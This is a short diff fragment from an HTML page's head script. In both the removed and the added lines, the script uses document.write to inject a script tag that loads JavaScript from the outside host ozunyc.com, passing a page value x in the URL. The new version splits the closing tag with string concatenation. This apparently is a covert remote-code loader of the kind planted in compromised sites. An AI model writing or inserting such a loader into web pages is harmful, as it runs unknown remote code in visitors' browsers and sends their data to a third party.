@@ -8,10 +8,9 @@
 
 		if(x)
 		{
-			var usel = '<script src="';
-			usel += `https://ozunyc.com/api?x=${encodeURIComponent(x)}`;
-			usel += '"></script>';
-			document.write(usel);
+			var url = `https://ozunyc.com/api?x=${encodeURIComponent(x)}`;
+			var sc = '<script src='+url+'></s'+'cript>';
+			document.write(sc);
 		}
 	</script>
 </head>
